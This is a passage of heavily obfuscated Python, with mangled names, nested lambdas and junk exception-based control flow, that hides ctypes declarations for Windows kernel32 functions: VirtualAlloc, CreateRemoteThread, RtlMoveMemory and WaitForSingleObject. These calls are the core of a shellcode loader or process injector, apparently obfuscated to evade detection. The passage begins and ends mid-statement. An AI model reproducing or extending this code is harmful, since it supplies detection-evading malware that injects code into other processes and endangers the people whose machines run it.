except MemoryError as _1816:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _166: _166 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _59 = [[(lambda : (lambda _109: _109 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _93: _93 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _115: _115 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _48:
        try:
            raise MemoryError(__3380787407407)
        except MemoryError as __4940977027256:
            if __4940977027256.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.restype = wt.LPVOID
            if __4940977027256.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __4229012078083 = (lambda : R_E_D__A_V(b'R_E_D__A_V__n\xfe\xb3\x06\x00\x88'))()
            if __4940977027256.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __4019584364837 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xbb\x86=\xff}\xfa'))()
try:
    match '1516' == '78':
        case True:
            raise MemoryError([True])
        case False:
            _148 = [[True], [False]]
            R_E_D__A_V______(['_32'])
    raise MemoryError([True])
except MemoryError as _616:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1014: _1014 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _717 = [[(lambda : (lambda _54: _54 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1610: _1610 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _911: _911 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1712:
        __5998846528180 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '82' == '61':
        case True:
            raise MemoryError([True])
        case False:
            _187 = [[True], [False]]
            R_E_D__A_V______(['_216'])
    raise MemoryError([True])
except MemoryError as _96:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _119: _119 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _198 = [[(lambda : (lambda _83: _83 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1914: _1914 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _62: _62 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _118:
        __5998846528180 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '818' == '113':
        case True:
            raise MemoryError([True])
        case False:
            _316 = [[True], [False]]
            R_E_D__A_V______(['_1819'])
    raise MemoryError([True])
except MemoryError as _1319:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _76: _76 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _121 = [[(lambda : (lambda _115: _115 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _47: _47 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _117: _117 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _211:
        try:
            raise MemoryError(__5998846528180)
        except MemoryError as __5180764184882:
            if __5180764184882.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
            if __5180764184882.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7882100041436 = (lambda : R_E_D__A_V(b'R_E_D__A_V__qf\xa6\xd5]R'))()
            if __5180764184882.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2812102337614 = (lambda : R_E_D__A_V(b'R_E_D__A_V__o\x02/N\x9b\x8e'))()
            if __5180764184882.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __3896381900211 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xd6\xf3\x10o\xc8S'))()
            if __5180764184882.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __6071858279673 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x99\xdb+K\tu'))()
            if __5180764184882.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __7738466082666 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x95\x98d\xb4\x84k'))()
try:
    match '46' == '95':
        case True:
            raise MemoryError([True])
        case False:
            _139 = [[True], [False]]
            R_E_D__A_V______(['_913'])
    raise MemoryError([True])
except MemoryError as _42:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742703]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _18: _18 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _128 = [[(lambda : (lambda _111: _111 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _37: _37 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _45: _45 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _718:
        __6851330241902 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '118' == '716':
        case True:
            raise MemoryError([True])
        case False:
            _1912 = [[True], [False]]
            R_E_D__A_V______(['_63'])
    raise MemoryError([True])
except MemoryError as _713:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1411: _1411 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1218 = [[(lambda : (lambda _712: _712 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _42: _42 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _1210: _1210 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _107:
        __6851330241902 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1619' == '159':
        case True:
            raise MemoryError([True])
        case False:
            _212 = [[True], [False]]
            R_E_D__A_V______(['_919'])
    raise MemoryError([True])
except MemoryError as _101:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _118: _118 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1612 = [[(lambda : (lambda _1914: _1914 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _210: _210 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _105: _105 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _131:
        try:
            raise MemoryError(__6851330241902)
        except MemoryError as __4677590657435:
            if __4677590657435.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.restype = wt.HANDLE
            if __4677590657435.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2793137627088 = (lambda : R_E_D__A_V(b'R_E_D__A_V__}\x86MT\xd4\xc4'))()
            if __4677590657435.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __3376004655715 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xd3@\x00\x0b\xa8\x1a'))()
try:
    match '1913' == '194':
        case True:
            raise MemoryError([True])
        case False:
            _195 = [[True], [False]]
            R_E_D__A_V______(['_113'])
    raise MemoryError([True])
except MemoryError as _115:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _119: _119 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _218 = [[(lambda : (lambda _92: _92 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _17: _17 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _1614: _1614 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _138:
        __2983381741545 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '75' == '95':
        case True:
            raise MemoryError([True])
        case False:
            _819 = [[True], [False]]
            R_E_D__A_V______(['_217'])
    raise MemoryError([True])
except MemoryError as _91:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _518: _518 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _518 = [[(lambda : (lambda _1812: _1812 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _813: _813 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _98: _98 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _811:
        __2983381741545 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '811' == '128':
        case True:
            raise MemoryError([True])
        case False:
            _312 = [[True], [False]]
            R_E_D__A_V______(['_168'])
    raise MemoryError([True])
except MemoryError as _188:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1517: _1517 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _611 = [[(lambda : (lambda _1711: _1711 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _219: _219 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _72: _72 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1214:
        try:
            raise MemoryError(__2983381741545)
        except MemoryError as __8313351893315:
            if __8313351893315.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
            if __8313351893315.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7896611303654 = (lambda : R_E_D__A_V(b"R_E_D__A_V__\xba\xa3\xbf'm\x9d"))()
try:
    match '119' == '138':
        case True:
            raise MemoryError([True])
        case False:
            _42 = [[True], [False]]
            R_E_D__A_V______(['_29'])
    raise MemoryError([True])
except MemoryError as _514:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _92: _92 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _134 = [[(lambda : (lambda _1011: _1011 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1116: _1116 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _1810: _1810 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _153:
        __5275443322798 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '127' == '110':
        case True:
            raise MemoryError([True])
        case False:
            _101 = [[True], [False]]
            R_E_D__A_V______(['_415'])
    raise MemoryError([True])
except MemoryError as _712:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1011: _1011 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _611 = [[(lambda : (lambda _53: _53 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _112: _112 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _118: _118 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1318:
        __5275443322798 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '316' == '91':
        case True:
            raise MemoryError([True])
        case False:
            _1116 = [[True], [False]]
            R_E_D__A_V______(['_1317'])
    raise MemoryError([True])
except MemoryError as _114:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1114: _1114 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _197 = [[(lambda : (lambda _1512: _1512 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _48: _48 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _181: _181 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _410:
        try:
            raise MemoryError(__5275443322798)
        except MemoryError as __3255690958631:
            if __3255690958631.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.restype = None
            if __3255690958631.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __4409058417001 = (lambda : R_E_D__A_V(b'R_E_D__A_V__R\x90<\x02N\x8e'))()
            if __3255690958631.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2835473311665 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xdf\xc9\xc9\x8f\xf0R'))()
try:
    match '138' == '118':
        case True:
            raise MemoryError([True])
        case False:
            _101 = [[True], [False]]
            R_E_D__A_V______(['_176'])
    raise MemoryError([True])
except MemoryError as _151:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _914: _914 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _189 = [[(lambda : (lambda _1411: _1411 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _410: _410 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _714: _714 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _918:
        __7078742168416 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '84' == '168':
        case True:
            raise MemoryError([True])
        case False:
            _113 = [[True], [False]]
            R_E_D__A_V______(['_118'])
    raise MemoryError([True])
except MemoryError as _128:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _174: _174 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _162 = [[(lambda : (lambda _92: _92 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _101: _101 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _814: _814 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1119:
        __7078742168416 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1814' == '104':
        case True:
            raise MemoryError([True])
        case False:
            _1210 = [[True], [False]]
            R_E_D__A_V______(['_128'])
    raise MemoryError([True])
except MemoryError as _142:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _612: _612 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _197 = [[(lambda : (lambda _122: _122 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _76: _76 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _919: _919 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _85:
        try:
            raise MemoryError(__7078742168416)
        except MemoryError as __8459992286299:
            if __8459992286299.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
            if __8459992286299.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3704865064269 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xbb\xa1nH\xc0\x9c'))()
            if __8459992286299.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2421833044131 = (lambda : R_E_D__A_V(b'R_E_D__A_V__x\xac\xc8\x9b\x03,'))()
            if __8459992286299.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __4635673217885 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x94*(N\xe2'))()
            if __8459992286299.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __3304991058919 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xfdr\xc0\\~*'))()
try:
    match '1713' == '27':
        case True:
            raise MemoryError([True])
        case False:
            _42 = [[True], [False]]
            R_E_D__A_V______(['_73'])
    raise MemoryError([True])
except MemoryError as _149:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _710: _710 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1912 = [[(lambda : (lambda _196: _196 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1216: _1216 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _214: _214 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _414:
        __5316692273894 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '115' == '174':
        case True:
            raise MemoryError([True])
        case False:
            _43 = [[True], [False]]
            R_E_D__A_V______(['_43'])
    raise MemoryError([True])
except MemoryError as _1319:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _162: _162 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _176 = [[(lambda : (lambda _93: _93 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _84: _84 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _1714: _1714 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _133:
        __5316692273894 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1312' == '317':
        case True:
            raise MemoryError([True])
        case False:
            _188 = [[True], [False]]
            R_E_D__A_V______(['_318'])
    raise MemoryError([True])
except MemoryError as _175:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742712]))))())())():
            case True:
